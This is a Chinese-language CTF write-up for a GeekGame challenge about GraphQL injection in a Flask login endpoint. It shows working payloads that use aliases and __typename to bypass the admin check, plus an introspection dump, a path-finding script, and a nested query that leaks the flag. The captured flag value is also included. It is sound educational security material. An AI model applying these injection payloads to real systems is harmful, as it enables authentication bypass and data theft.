# %% [markdown]
# # 统一身份认证
#
# 本题又名GraphQL的入门与精通。
#
# ### Flag1
#
# 观察app.py源码，我们能看出这是一个非常经典的注入：
#
# ```python
# @app.route("/login", methods=["POST"])
# def login():
#     clear_session()
#     username = request.form.get("username", "").strip()
#     password = request.form.get("password", "")
#     if not validate(username, password):
#         return redirect(url_for("index"))
#     log("login:username", username)
#     log("login:password", password)
#     query = f'''
#     query ($username: String = "{username}", $password: String = "{password}") {{
#       login(username: $username, password: $password) {{
#         ok
#         isAdmin
#         username
#       }}
#     }}
#     '''
# ```
#
# 需要我们构造输入，使得断点返回的isAdmin为Truthy（不一定是True，可以是任意非空字符串）。实际上Flag1的大多数时间都在大战GraphQL语法（本题万恶的没有回显，需要找一个[GraphQL在线验证器](https://www.leskoff.com/s01928-0)来看syntax错在哪）。构造一个非空字符串很简单，GraphQL有一些magic var（比如__typename返回当前类型的名称），我们很容易就能想到以下注入：
#
# ```graphql
# p") {
#   login(username: "u", password: "p") {
#     ok: __typename
#     isAdmin: ok
#     username: __typename
#   }
# } #
# ```
#
# 但是GraphQL的语法限制导致：
# - 我们不能构造另一个query，因为一个查询只允许一个匿名query；
# - 我们构造的值必须叫login，而GraphQL不能出现两个相同的字段。
#
# 可以活用[GraphQL别名](https://graphql.cn/learn/queries/#aliases)功能，进行一个字段的重命名。最后注入的payload如下：
#
# ```graphql
# p") {
#   login(username: "u", password: "p") {
#     ok: __typename
#     isAdmin: ok
#     username: __typename
#   }
#   x:
# #
# ```
#
# 注入完的Query长这样：
#
# ```graphql
# query ($username: String = "u", $password: String = "p") {
#     login(username: $username, password: $password) {
#         ok: __typename
#         isAdmin: ok
#         username: __typename
#     }
# x:
# #") {
#     login(username: $username, password: $password) {
#         ok
#         isAdmin
#         username
#     }
# }

# %% [markdown]
# ### Flag2
#
# Flag2要求我们dump出GraphQL的Schema，实际上考察的是你知不知道[GraphQL的Introspection功能](https://graphql.org/learn/introspection/)。实际上我们可以构造特定的Payload，让某个查询的结果回显到Username。先拿到所有的类型名称和字段尝尝咸淡：

# %%
import requests

URL = "https://prob11-wc3g9fcv.geekgame.pku.edu.cn/login"
# URL = "http://localhost:5000/login"

def make_register_request(username: str, password: str) -> dict:
    resp = requests.post(
        URL,
        data={
            "username": username,
            "password": password,
        }
    )
    return resp.text

r = make_register_request("u", """p") {
  login: __schema {
    ok: __typename
    isAdmin: __typename
    username: types {
      name
      fields {
        name
        type: type {
          name
        }
      }
    }
  }
x: ##""")
print(r)
# Out:
# <!doctype html>
# <html>
#
# <head>
#   <meta charset="utf-8">
#   <title>华清大学用户电子身份服务系统</title>
#   <link rel="stylesheet" href="https://unpkg.com/@picocss/pico@2/css/pico.min.css" crossorigin="anonymous">
# </head>
#
# <body>
#   <header style="display: flex; justify-content: space-between; align-items: center; padding: 0 2rem; border-bottom: 1px solid;">
#     <h1 style="font-size: 1.5rem; padding: 1rem 0; margin-bottom: 0;">
#       <span>华清大学</span>
#       <span style="margin-left: 1rem; font-family: Kaiti,STKaiti,楷体,华文楷体;">用户电子身份服务系统</span>
#     </h1>
#
#       <form method="post" action="/logout">
#         <button type="submit" style="margin-bottom: 0; padding: 0.3rem 0.5rem;">退出</button>
#       </form>
#
#   </header>
#   <main style="display: flex; justify-content: center;">
#     <div>
#
#
#
#       <div style="display: flex; justify-content: center; gap: 6rem; padding: 3rem; border: 2px solid; border-radius: 0.75rem; margin-top: 1rem; min-width: 60vw;">
#
#           <section>
#             <h2 style="text-align: center;">个人信息</h2>
#             <div style="display: grid; grid-template-columns: auto auto; gap: 1rem;">
#               <strong>用户名</strong>
#               <div>[{&#39;fields&#39;: [{&#39;name&#39;: &#39;ok&#39;, &#39;type&#39;: {&#39;name&#39;: None}}, {&#39;name&#39;: &#39;isAdmin&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Boolean&#39;}}, {&#39;name&#39;: &#39;username&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;String&#39;}}], &#39;name&#39;: &#39;User&#39;}, {&#39;fields&#39;: None, &#39;name&#39;: &#39;Boolean&#39;}, {&#39;fields&#39;: None, &#39;name&#39;: &#39;String&#39;}, {&#39;fields&#39;: [{&#39;name&#39;: &#39;ok&#39;, &#39;type&#39;: {&#39;name&#39;: None}}], &#39;name&#39;: &#39;RegisterResult&#39;}, {&#39;fields&#39;: [{&#39;name&#39;: &#39;not_flag_bkht&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Int&#39;}}, {&#39;name&#39;: &#39;not_flag_SsDg&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Boolean&#39;}}, {&#39;name&#39;: &#39;not_flag_MyL3&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Boolean&#39;}}, {&#39;name&#39;: &#39;not_flag_jdPD&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Int&#39;}}, {&#39;name&#39;: &#39;not_flag_9SXP&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Int&#39;}}], &#39;name&#39;: &#39;Secret_zY0Q&#39;}, {&#39;fields&#39;: None, &#39;name&#39;: &#39;Int&#39;}, {&#39;fields&#39;: [{&#39;name&#39;: &#39;not_flag_21ZS&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Int&#39;}}, {&#39;name&#39;: &#39;not_flag_ujhQ&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;String&#39;}}, {&#39;name&#39;: &#39;not_flag_HkGj&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Float&#39;}}, {&#39;name&#39;: &#39;not_flag_J2h6&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Boolean&#39;}}], &#39;name&#39;: &#39;Secret_IMhx&#39;}, {&#39;fields&#39;: None, &#39;name&#39;: &#39;Float&#39;}, {&#39;fields&#39;: [{&#39;name&#39;: &#39;not_flag_Lb0v&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Float&#39;}}, {&#39;name&#39;: &#39;not_flag_PahS&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Boolean&#39;}}, {&#39;name&#39;: &#39;secret_Lld2&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Secret_AxyC&#39;}}, {&#39;name&#39;: &#39;secret_6b4E&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Secret_5Xul&#39;}}, {&#39;name&#39;: &#39;secret_No7I&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Secret_g2ES&#39;}}], &#39;name&#39;: &#39;Secret_6zkj&#39;}, {&#39;fields&#39;: [{&#39;name&#39;: &#39;not_flag_HLvG&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Float&#39;}}, {&#39;name&#39;: &#39;not_flag_S91M&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;String&#39;}}, {&#39;name&#39;: &#39;not_flag_G96v&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Float&#39;}}, {&#39;name&#39;: &#39;not_flag_GY4E&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Boolean&#39;}}, {&#39;name&#39;: &#39;not_flag_vlua&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Float&#39;}}], &#39;name&#39;: &#39;Secret_zhwl&#39;}, {&#39;fields&#39;: [{&#39;name&#39;: &#39;not_flag_cJT2&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Int&#39;}}, {&#39;name&#39;: &#39;not_flag_zmdf&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Float&#39;}}, {&#39;name&#39;: &#39;not_flag_EYJN&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Float&#39;}}, {&#39;name&#39;: &#39;not_flag_jDBA&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Float&#39;}}], &#39;name&#39;: &#39;Secret_HvCf&#39;}, {&#39;fields&#39;: [{&#39;name&#39;: &#39;not_flag_7ewd&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Float&#39;}}, {&#39;name&#39;: &#39;not_flag_U2o7&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Boolean&#39;}}, {&#39;name&#39;: &#39;not_flag_gBYD&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Boolean&#39;}}, {&#39;name&#39;: &#39;secret_MWP4&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Secret_TdFZ&#39;}}], &#39;name&#39;: &#39;Secret_6zxy&#39;}, {&#39;fields&#39;: [{&#39;name&#39;: &#39;not_flag_WWm0&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;String&#39;}}, {&#39;name&#39;: &#39;not_flag_hxID&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Int&#39;}}, {&#39;name&#39;: &#39;not_flag_g4GR&#39;, &#39;type&#39;: {&#39;name&#39;: &#39;Boolean&#39;}}, {&#39;name&#39;: &#39;not_flag_6ZIh&#39;, &#39;type&#39;: {&#39;name&#39 ...
#
#             </div>
#           </section>
#
#       </div>
#     </div>
#   </main>
# </body>
#
# </html>

# %% [markdown]
# 【马保国：我去！.mp4】这Schema也太离谱了。看题目附件能知道，我们还需要找到Secret类型到flag2之间的一条Path，才能写出正确的查询。
#
# 以下我们写个代码parse一下结果，然后把这条Path遍历出来：

# %%
line_to_process = r.splitlines()[32].strip()
line_to_process = line_to_process[5:-6]
# decode the escaped characters like &#34; and &#39;
import html
line_to_process = html.unescape(line_to_process)
# eval the string to get a list
result = eval(line_to_process)
pprint(result)

_target = 'flag2'
names = []

for item in result:
    if not 'fields' in item:
        continue
    if not isinstance(item['fields'], list):
        continue
    for field in item['fields']:
        if not isinstance(field, dict):
            continue
        if not 'name' in field:
            continue
        if field['name'] == _target:
            print("Found target:", _target, item)
            names.append(field['name'])
            _target = item['name']
            break
        
_old_target = None

while _old_target != _target:
    _old_target = _target
    for item in result:
        if not 'fields' in item:
            continue
        if not isinstance(item['fields'], list):
            continue
        for field in item['fields']:
            if not isinstance(field, dict):
                continue
            if not 'name' in field:
                continue
            if field['type']['name'] == _target:
                print("Found target:", _target, item)
                names.append(field['name'])
                _target = item['name']
                break
        
names.reverse()
print(names)
# Out:
# [{'fields': [{'name': 'ok', 'type': {'name': None}},
#              {'name': 'isAdmin', 'type': {'name': 'Boolean'}},
#              {'name': 'username', 'type': {'name': 'String'}}],
#   'name': 'User'},
#  {'fields': None, 'name': 'Boolean'},
#  {'fields': None, 'name': 'String'},
#  {'fields': [{'name': 'ok', 'type': {'name': None}}], 'name': 'RegisterResult'},
#  {'fields': [{'name': 'not_flag_bkht', 'type': {'name': 'Int'}},
#              {'name': 'not_flag_SsDg', 'type': {'name': 'Boolean'}},
#              {'name': 'not_flag_MyL3', 'type': {'name': 'Boolean'}},
#              {'name': 'not_flag_jdPD', 'type': {'name': 'Int'}},
#              {'name': 'not_flag_9SXP', 'type': {'name': 'Int'}}],
#   'name': 'Secret_zY0Q'},
#  {'fields': None, 'name': 'Int'},
#  {'fields': [{'name': 'not_flag_21ZS', 'type': {'name': 'Int'}},
#              {'name': 'not_flag_ujhQ', 'type': {'name': 'String'}},
#              {'name': 'not_flag_HkGj', 'type': {'name': 'Float'}},
#              {'name': 'not_flag_J2h6', 'type': {'name': 'Boolean'}}],
#   'name': 'Secret_IMhx'},
#  {'fields': None, 'name': 'Float'},
#  {'fields': [{'name': 'not_flag_Lb0v', 'type': {'name': 'Float'}},
#              {'name': 'not_flag_PahS', 'type': {'name': 'Boolean'}},
#              {'name': 'secret_Lld2', 'type': {'name': 'Secret_AxyC'}},
#              {'name': 'secret_6b4E', 'type': {'name': 'Secret_5Xul'}},
#              {'name': 'secret_No7I', 'type': {'name': 'Secret_g2ES'}}],
#   'name': 'Secret_6zkj'},
#  {'fields': [{'name': 'not_flag_HLvG', 'type': {'name': 'Float'}},
#              {'name': 'not_flag_S91M', 'type': {'name': 'String'}},
#              {'name': 'not_flag_G96v', 'type': {'name': 'Float'}},
#              {'name': 'not_flag_GY4E', 'type': {'name': 'Boolean'}},
#              {'name': 'not_flag_vlua', 'type': {'name': 'Float'}}],
#   'name': 'Secret_zhwl'},
#  {'fields': [{'name': 'not_flag_cJT2', 'type': {'name': 'Int'}},
#              {'name': 'not_flag_zmdf', 'type': {'name': 'Float'}},
#              {'name': 'not_flag_EYJN', 'type': {'name': 'Float'}},
#              {'name': 'not_flag_jDBA', 'type': {'name': 'Float'}}],
#   'name': 'Secret_HvCf'},
#  {'fields': [{'name': 'not_flag_7ewd', 'type': {'name': 'Float'}},
#              {'name': 'not_flag_U2o7', 'type': {'name': 'Boolean'}},
#              {'name': 'not_flag_gBYD', 'type': {'name': 'Boolean'}},
#              {'name': 'secret_MWP4', 'type': {'name': 'Secret_TdFZ'}}],
#   'name': 'Secret_6zxy'},
#  {'fields': [{'name': 'not_flag_WWm0', 'type': {'name': 'String'}},
#              {'name': 'not_flag_hxID', 'type': {'name': 'Int'}},
#              {'name': 'not_flag_g4GR', 'type': {'name': 'Boolean'}},
#              {'name': 'not_flag_6ZIh', 'type': {'name': 'Float'}}],
#   'name': 'Secret_HOA4'},
#  {'fields': [{'name': 'not_flag_OZV4', 'type': {'name': 'String'}},
#              {'name': 'not_flag_zORe', 'type': {'name': 'Int'}},
#              {'name': 'not_flag_7ujU', 'type': {'name': 'Boolean'}},
# ...
#              {'name': 'directives', 'type': {'name': None}}],
#   'name': '__Schema'},
#  {'fields': [{'name': 'kind', 'type': {'name': None}},
#              {'name': 'name', 'type': {'name': 'String'}},
#              {'name': 'description', 'type': {'name': 'String'}},
#              {'name': 'specifiedByURL', 'type': {'name': 'String'}},
#              {'name': 'fields', 'type': {'name': None}},
#              {'name': 'interfaces', 'type': {'name': None}},
#              {'name': 'possibleTypes', 'type': {'name': None}},
#              {'name': 'enumValues', 'type': {'name': None}},
#              {'name': 'inputFields', 'type': {'name': None}},
#              {'name': 'ofType', 'type': {'name': '__Type'}}],
#   'name': '__Type'},
#  {'fields': None, 'name': '__TypeKind'},
#  {'fields': [{'name': 'name', 'type': {'name': None}},
#              {'name': 'description', 'type': {'name': 'String'}},
#              {'name': 'args', 'type': {'name': None}},
#              {'name': 'type', 'type': {'name': None}},
#              {'name': 'isDeprecated', 'type': {'name': None}},
#              {'name': 'deprecationReason', 'type': {'name': 'String'}}],
#   'name': '__Field'},
#  {'fields': [{'name': 'name', 'type': {'name': None}},
#              {'name': 'description', 'type': {'name': 'String'}},
#              {'name': 'type', 'type': {'name': None}},
#              {'name': 'defaultValue', 'type': {'name': 'String'}},
#              {'name': 'isDeprecated', 'type': {'name': None}},
#              {'name': 'deprecationReason', 'type': {'name': 'String'}}],
#   'name': '__InputValue'},
#  {'fields': [{'name': 'name', 'type': {'name': None}},
#              {'name': 'description', 'type': {'name': 'String'}},
#              {'name': 'isDeprecated', 'type': {'name': None}},
#              {'name': 'deprecationReason', 'type': {'name': 'String'}}],
#   'name': '__EnumValue'},
#  {'fields': [{'name': 'name', 'type': {'name': None}},
#              {'name': 'description', 'type': {'name': 'String'}},
#              {'name': 'isRepeatable', 'type': {'name': None}},
#              {'name': 'locations', 'type': {'name': None}},
#              {'name': 'args', 'type': {'name': None}}],
#   'name': '__Directive'},
#  {'fields': None, 'name': '__DirectiveLocation'}]
# Found target: flag2 {'fields': [{'name': 'not_flag_SQzN', 'type': {'name': 'Int'}}, {'name': 'flag2', 'type': {'name': 'String'}}, {'name': 'not_flag_SQyP', 'type': {'name': 'String'}}, {'name': 'not_flag_UnOk', 'type': {'name': 'Int'}}, {'name': 'not_flag_Ig7p', 'type': {'name': 'Float'}}], 'name': 'Secret_f67s'}
# Found target: Secret_f67s {'fields': [{'name': 'not_flag_ifAx', 'type': {'name': 'Boolean'}}, {'name': 'not_flag_aCdK', 'type': {'name': 'String'}}, {'name': 'secret_ZGyG', 'type': {'name': 'Secret_k9P0'}}, {'name': 'not_flag_Lv9D', 'type': {'name': 'Float'}}, {'name': 'secret_unrf', 'type': {'name': 'Secret_f67s'}}], 'name': 'Secret_a1VR'}
# Found target: Secret_a1VR {'fields': [{'name': 'secret_upMm', 'type': {'name': 'Secret_EBoH'}}, {'name': 'secret_ZXYc', 'type': {'name': 'Secret_uI7N'}}, {'name': 'secret_ip6S', 'type': {'name': 'Secret_YhF9'}}, {'name': 'secret_BDaS', 'type': {'name': 'Secret_a1VR'}}], 'name': 'Secret_EPaA'}
# Found target: Secret_EPaA {'fields': [{'name': 'secret_vtXk', 'type': {'name': 'Secret_KB8w'}}, {'name': 'secret_poW2', 'type': {'name': 'Secret_yhxV'}}, {'name': 'secret_4OPY', 'type': {'name': 'Secret_EPaA'}}, {'name': 'secret_zG8I', 'type': {'name': 'Secret_31SE'}}], 'name': 'Secret_URVl'}
# Found target: Secret_URVl {'fields': [{'name': 'secret_IQHP', 'type': {'name': 'Secret_Dps2'}}, {'name': 'secret_DnfM', 'type': {'name': 'Secret_dPQl'}}, {'name': 'secret_g7ax', 'type': {'name': 'Secret_vPVM'}}, {'name': 'secret_QVl8', 'type': {'name': 'Secret_tmNN'}}, {'name': 'secret_VU3H', 'type': {'name': 'Secret_URVl'}}], 'name': 'Secret_TCTT'}
# Found target: Secret_TCTT {'fields': [{'name': 'secret_ixPy', 'type': {'name': 'Secret_yBAt'}}, {'name': 'secret_E7bx', 'type': {'name': 'Secret_gzUi'}}, {'name': 'secret_62EG', 'type': {'name': 'Secret_TCTT'}}, {'name': 'secret_jOp3', 'type': {'name': 'Secret_d43w'}}], 'name': 'Secret_VvBX'}
# Found target: Secret_VvBX {'fields': [{'name': 'secret_V5Vr', 'type': {'name': 'Secret_ylFJ'}}, {'name': 'secret_VPLl', 'type': {'name': 'Secret_on42'}}, {'name': 'secret_5YfD', 'type': {'name': 'Secret_glTZ'}}, {'name': 'secret_sYtr', 'type': {'name': 'Secret_VvBX'}}], 'name': 'Secret_Mvys'}
# Found target: Secret_Mvys {'fields': [{'name': 'secret_7QV3', 'type': {'name': 'Secret_NnRX'}}, {'name': 'secret_6XIb', 'type': {'name': 'Secret_mOWP'}}, {'name': 'secret_nA4t', 'type': {'name': 'Secret_Mvys'}}, {'name': 'secret_WEhZ', 'type': {'name': 'Secret_BqXI'}}, {'name': 'not_part_of_challenge', 'type': {'name': 'NotPartOfChallenge'}}], 'name': 'Secret'}
# Found target: Secret {'fields': [{'name': 'login', 'type': {'name': 'User'}}, {'name': 'secret', 'type': {'name': 'Secret'}}], 'name': 'Query'}
# ['secret', 'secret_nA4t', 'secret_sYtr', 'secret_62EG', 'secret_VU3H', 'secret_4OPY', 'secret_BDaS', 'secret_unrf', 'flag2']

# %% [markdown]
# 好好好！接下来发个请求，让Flag2回显到Username：

# %%
import requests

def make_register_request(username: str, password: str) -> dict:
    resp = requests.post(
        URL,
        data={
            "username": username,
            "password": password,
        }
    )
    return resp.text

r = make_register_request("u", """p") {
  login: secret { 
    ok: __typename
    isAdmin: __typename
    username: secret_nA4t { secret_sYtr { secret_62EG { secret_VU3H { secret_4OPY { secret_BDaS { secret_unrf { flag2 } } } } } } } 
  }
x: ##""")
print(r)
# Out:
# <!doctype html>
# <html>
#
# <head>
#   <meta charset="utf-8">
#   <title>华清大学用户电子身份服务系统</title>
#   <link rel="stylesheet" href="https://unpkg.com/@picocss/pico@2/css/pico.min.css" crossorigin="anonymous">
# </head>
#
# <body>
#   <header style="display: flex; justify-content: space-between; align-items: center; padding: 0 2rem; border-bottom: 1px solid;">
#     <h1 style="font-size: 1.5rem; padding: 1rem 0; margin-bottom: 0;">
#       <span>华清大学</span>
#       <span style="margin-left: 1rem; font-family: Kaiti,STKaiti,楷体,华文楷体;">用户电子身份服务系统</span>
#     </h1>
#
#       <form method="post" action="/logout">
#         <button type="submit" style="margin-bottom: 0; padding: 0.3rem 0.5rem;">退出</button>
#       </form>
#
#   </header>
#   <main style="display: flex; justify-content: center;">
#     <div>
#
#
#
#       <div style="display: flex; justify-content: center; gap: 6rem; padding: 3rem; border: 2px solid; border-radius: 0.75rem; margin-top: 1rem; min-width: 60vw;">
#
#           <section>
#             <h2 style="text-align: center;">个人信息</h2>
#             <div style="display: grid; grid-template-columns: auto auto; gap: 1rem;">
#               <strong>用户名</strong>
#               <div>{&#39;secret_sYtr&#39;: {&#39;secret_62EG&#39;: {&#39;secret_VU3H&#39;: {&#39;secret_4OPY&#39;: {&#39;secret_BDaS&#39;: {&#39;secret_unrf&#39;: {&#39;flag2&#39;: &#39;flag{eveRyOne_Can_SeE_youR_gRaPhqL_schemA}&#39;}}}}}}}</div>
#
#             </div>
#           </section>
#
#       </div>
#     </div>
#   </main>
# </body>
#
# </html>
